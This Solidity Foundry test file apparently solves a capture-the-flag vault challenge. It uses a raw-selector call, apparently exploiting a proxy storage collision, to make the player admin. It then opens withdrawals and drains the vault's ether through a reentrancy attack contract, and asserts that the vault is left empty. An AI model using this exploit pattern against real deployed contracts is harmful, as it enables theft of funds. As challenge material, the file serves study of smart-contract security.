// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/attack.sol";




contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;
    ReentrancyAttack public attack;


    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        //修改管理员权限
        bytes memory payload = abi.encodeWithSelector(0xd3a5b107, address(logic), palyer);
        (bool success, ) = address(vault).call(payload);
        require(success, "Admin update failed");


        //打开可取款判断
        vault.openWithdraw();
        require(vault.canWithdraw(),"no opne");

        //创建重入攻击合约
        attack = new ReentrancyAttack(address(vault));



        //重入攻击
        attack.attack{value: 0.1 ether}();

        assertEq(address(vault).balance, 0, "Vault still has funds");
        assertEq(address(attack).balance, 0.2 ether, "Player did not receive expected amount");

        require(vault.isSolve(), "solved");
        vm.stopPrank();

    }

}

